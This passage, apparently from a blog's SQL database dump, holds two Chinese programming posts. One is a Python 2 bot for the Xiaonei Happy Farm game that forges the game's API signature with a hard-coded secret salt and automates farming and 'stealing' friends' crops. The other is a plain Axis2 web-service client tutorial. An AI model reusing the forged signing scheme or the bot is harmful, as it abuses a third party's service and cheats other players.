p;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print f[\'userName\']<br />#&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print farm.showFriend(f[\'userId\']) #好友信息<br />&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print farm.status<br />#&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.scarity(1842469710,0) <br />#&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.seed(2,1842469710,0)<br /><br />',1,1,1,0,0,0,'登录成功，获取数据成功，翻地成功，播种成功，获取好友列表与好友详细信息成功，尚未解析返回数据的字段意义。#!/usr/bin/env python#encoding: utf-8import urllib,urllib2,cookielibimport httplib2import time,zlib,re,md5import cStringIO,gzipimport jsonclass Xiaonei:&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;debug=True&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#创建Cookie&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def __init__(self):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;cj=cookielib.LWPCookieJar()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;opener.addheaders=[(\'User-agent\',\'Opera/9.23\')]&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;urllib2.install_opener(opener)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 登录校内网&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def login(self, email, password):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\"http://login.xiaonei.com/Login.do\"&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body=((\"email\",email),(\"password\",password))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.req(url,body)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 请求网页的工具函数，直接返回网页内容&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def req(self,url,body=()):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(body)==0:&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=urllib2.Request(url)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=urllib2.Request(url,urllib.urlencode(body))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;raw=urllib2.urlopen(req)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.debug: #输出调试信息&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print url&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print raw.headers&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return raw.read()class Farm(Xiaonei):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;status={}&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;friends={}&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def param(self): # build params farmKey and farmTime&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farmTime=str(time.time())[0:10]&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farmKey=md5.md5(farmTime+\'15l3h4kh\').hexdigest()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return (farmKey, farmTime)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 获取校内网到开心网的链接地址,并取得Cookie&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def getFarm(self):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# build cookie to faminutes&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://apps.xiaonei.com/happyfarm?origin=103\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=re.findall(\'iframe_canvas\" src=\"([^\"]+)\"\',self.req(url))[0]&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=url.replace(\'?\',\'/?\') # fuck url, it lacks a \'/\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=urllib2.Request(url)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;raw=urllib2.urlopen(req)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# read current status&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://xn.hf.fminutes.com/api.php?mod=user&amp;act=run&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=\' % self.param()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.status=json.read(self.req(url))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 获取所有好友&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def listFriends(self):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\"http://xn.hf.fminutes.com/api.php?mod=friend&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=\" % self.param()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body=({\"refresh\":\"true\"})&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.friends=json.read(self.req(url,body))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 获取好友信息&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def showFriend(self,fid):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://xn.hf.fminutes.com/api.php?mod=user&amp;act=run&amp;flag=1&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=\' % self.param()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={\'ownerId\':fid}&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 浇水 fid: 用户ID place:土地编号&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def water(self,fid,place):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=water&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=\' % self.param()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={\'ownerId\':fid,\'place\':place}&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 除草 fid:用户ID place:土地编号&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def clearWeed(self,fid,place):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=clearWeed&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=\' % self.param()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={\'ownerId\':fid,\'place\':place}&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 获取自己购买的物品&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def bag(self):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://xn.hf.fminutes.com/api.php?mod=repertory&amp;act=getUserSeed&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=\' % self.param()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 翻土&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def scarity(self,fid,place):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=scarify&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=\' % self.param()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={\'ownerId\':fid,\'place\':place}&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 种植 cid: 种子编号 uid: 用户编号 place: 土地编号&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def seed(self,cid,uid,place):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=planting&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=\' % self.param()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={\'cId\':cid,\'ownerId\':uid,\'place\':place}&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 偷好友的果子 fid:好友编号 place:土地编号&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def steal(self,fid,place):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=scrounge&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=\' % self.param()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={\"ownerId\":fid,\"place\":place}&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))if __name__==\'__main__\':&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm = Farm()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.login(\"校内用户名\",\"校内密码\")&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.getFarm();&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.listFriends()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for f in farm.friends: #输出所有好友&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print f[\'userName\']#&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print farm.showFriend(f[\'userId\']) #好友信息&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print farm.status#&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.scarity(1842469710,0) #&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.seed(2,1842469710,0)','',0,'develop',0,'','zinnia/_entry_detail.html','entry_detail.html'),(100,'使用Axis2开发Web Service客户端','33731937200846103922404',2,'2008-05-06 22:39:22',NULL,'2008-05-06 22:39:22','2014-07-13 18:57:13','<p>4种方式，ADB，AXIOM，XMLBEANS，JIBX，后两种方式比较复杂。</p>  <p>ADB需要用Axis2提供的WSDL2Java生成Stub，然后调用的时候隐藏全部细节，调用方式很简单，和JDK6原生提供的方式很像。</p>  <p>AXIOM不需要wsdl2java，完全用axiom的类，封装不够好。</p>  <p>ADB，首先使用命令行生成wsdl对应的Java Stub和Callback文件</p>  <p>wsdl2java -uri <a href=\"http://localhost:8080/axis2/services/StockQuoteService?wsdl\" rel=\"nofollow\">http://localhost:8080/axis2/services/StockQuoteService?wsdl</a></p>  <p>ADBClient.java</p>  <p style=\"TEXT-INDENT: 2em;\">  </p><p>package client;</p>  <p>import org.apache.axis2.StockQuoteServiceStub;</p>  <p>/**<br />&nbsp;* First of all, go to cmd<br />&nbsp;* set AXIS2_HOME=E:\\programe\\j2ee\\axis2<br />&nbsp;* wsdl2java -uri <a href=\"http://localhost:8080/axis2/services/StockQuoteService?wsdl\" rel=\"nofollow\">http://localhost:8080/axis2/services/StockQuoteService?wsdl</a><br />&nbsp;* @author hankjin<br />&nbsp;*<br />&nbsp;*/<br />public class ADBClient {<br />&nbsp;public static void main(java.lang.String args[]){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StockQuoteServiceStub stub =<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new StockQuoteServiceStub();//(\"<a href=\"http://localhost:8080/axis2/services/StockQuoteService\" rel=\"nofollow\">http://localhost:8080/axis2/services/StockQuoteService</a>\");</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; getPrice(stub);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; update(stub);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; getPrice(stub);</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch(Exception e){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(\"\\n\\n\\n\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; }</p>  <p>&nbsp;&nbsp;&nbsp; /* fire and forget */<br />&nbsp;&nbsp;&nbsp; public static void update(StockQuoteServiceStub stub){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StockQuoteServiceStub.Update req = new StockQuoteServiceStub.Update();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.setSymbol (\"ABC\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.setPrice (42.35);</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stub.update(req);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(\"price updated\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch(Exception e){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(\"\\n\\n\\n\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; }</p>  <p>&nbsp;&nbsp;&nbsp; /* two way call/receive */<br />&nbsp;&nbsp;&nbsp; public static void getPrice(StockQuoteServiceStub stub){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StockQuoteServiceStub.GetPrice req = new StockQuoteServiceStub.GetPrice();</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.setSymbol(\"ABC\");</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StockQuoteServiceStub.GetPriceResponse res =<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stub.getPrice(req);</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(res.get_return());<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch(Exception e){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(\"\\n\\n\\n\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; }</p>  <p>}</p>  <p>&nbsp;</p>  <p>AXIOMClient.java</p>  <p>package client;<br />/**<br />&nbsp;* This method is simply but complex<br />&nbsp;* simple is because it needs nothing<br />&nbsp;* complex is because it has to build xml itself<br />&nbsp;*/<br />import org.apache.axiom.om.OMAbstractFactory;<br />import org.apache.axiom.om.OMElement;<br />import org.apache.axiom.om.OMFactory;<br />import org.apache.axiom.om.OMNamespace;<br />import org.apache.axis2.Constants;<br />import org.apache.axis2.addressing.EndpointReference;<br />import org.apache.axis2.client.Options;<br />import org.apache.axis2.client.ServiceClient;</p>  <p>public class AXIOMClient {</p>  <p>&nbsp;&nbsp;&nbsp; private static EndpointReference targetEPR = <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new EndpointReference(\"<a href=\"http://localhost:8080/axis2/services/StockQuoteService\" rel=\"nofollow\">http://localhost:8080/axis2/services/StockQuoteService</a>\");</p>  <p>&nbsp;&nbsp;&nbsp; public static OMElement getPricePayload(String symbol) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMFactory fac = OMAbstractFactory.getOMFactory();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMNamespace omNs = fac.createOMNamespace(\"<a href=\"http://xsd\" rel=\"nofollow\">http:///xsd</a>\", \"tns\");</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement method = fac.createOMElement(\"getPrice\", omNs);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement value = fac.createOMElement(\"symbol\", omNs);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value.addChild(fac.createOMText(value, symbol));<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; method.addChild(value);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return method;<br />&nbsp;&nbsp;&nbsp; }</p>  <p>&nbsp;&nbsp;&nbsp; public static OMElement updatePayload(String symbol, double price) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMFactory fac = OMAbstractFactory.getOMFactory();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMNamespace omNs = fac.createOMNamespace(\"<a href=\"http://xsd\" rel=\"nofollow\">http:///xsd</a>\", \"tns\");</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement method = fac.createOMElement(\"update\", omNs);</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement value1 = fac.createOMElement(\"symbol\", omNs);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value1.addChild(fac.createOMText(value1, symbol));<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; method.addChild(value1);</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement value2 = fac.createOMElement(\"price\", omNs);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value2.addChild(fac.createOMText(value2,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Double.toString(price)));<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; method.addChild(value2);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return method;<br />&nbsp;&nbsp;&nbsp; }</p>  <p>&nbsp;&nbsp;&nbsp; public static void main(String[] args) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement getPricePayload = getPricePayload(\"WSO\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement updatePayload = updatePayload(\"WSO\", 123.42);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Options options = new Options();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; options.setTo(targetEPR);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; options.setTransportInProtocol(Constants.TRANSPORT_HTTP);</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ServiceClient sender = new ServiceClient();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sender.setOptions(options);</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sender.fireAndForget(updatePayload);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(\"price updated\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement result = sender.sendReceive(getPricePayload);</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String response = result.getFirstElement().getText();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(\"Current price of WSO: \" + response);</p>  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch (Exception e) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; <br />}<br /></p>  <p>&nbsp;</p>',1,1,1,0,0,0,'4种方式，ADB，AXIOM，XMLBEANS，JIBX，后两种方式比较复杂。  ADB需要用Axis2提供的WSDL2Java生成Stub，然后调用的时候隐藏全部细节，调用方式很简单，和JDK6原生提供的方式很像。  AXIOM不需要wsdl2java，完全用axiom的类，封装不够好。  ADB，首先使用命令行生成wsdl对应的Java Stub和Callback文件  wsdl2java -uri http://localhost:8080/axis2/services/StockQuoteService?wsdl  ADBClient.java    package client;  import org.apache.axis2.StockQuoteServiceStub;  /**&nbsp;* First of all, go to cmd&nbsp;* set AXIS2_HOME=E:\\programe\\j2ee\\axis2&nbsp;* wsdl2java -uri http://localhost:8080/axis2/services/StockQuoteService?wsdl&nbsp;* @author hankjin&nbsp;*&nbsp;*/public class ADBClient {&nbsp;public static void main(java.lang.String args[]){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StockQuoteServiceStub stub =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new StockQuoteServiceStub();//(\"http://localhost:8080/axis2/services/StockQuoteService\");  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 